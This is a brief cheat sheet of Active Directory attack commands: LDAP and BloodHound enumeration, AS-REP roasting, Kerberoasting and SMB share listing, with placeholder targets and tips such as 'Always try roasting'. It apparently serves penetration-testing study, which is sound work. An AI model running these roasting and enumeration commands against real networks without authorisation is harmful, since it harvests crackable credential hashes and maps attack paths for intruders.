# 04 – Active Directory Enumeration

## Goal

Find:
- users
- groups
- attack paths

---

## 1. LDAP Enumeration

```bash
ldapsearch -x -H ldap://<IP> -s base namingcontexts
```

---

## 2. BloodHound

```bash
bloodhound-python -u user -p pass -ns <DC_IP> -d domain.local -c All
```

---

## 3. AS-REP Roasting

```bash
GetNPUsers.py DOMAIN.LOCAL/ -dc-ip <DC_IP> -usersfile users.txt -no-pass
```

---

## 4. Kerberoasting

```bash
GetUserSPNs.py DOMAIN.LOCAL/user:pass -dc-ip <DC_IP> -request
```

---

## 5. SMB + AD

```bash
crackmapexec smb <IP> -u user -p pass --shares
```

---

## 6. Check Privileges

- admin groups
- delegation
- service accounts

---

## 7. Golden Rules

- BloodHound early = huge advantage
- Always try roasting
- Credentials = everything
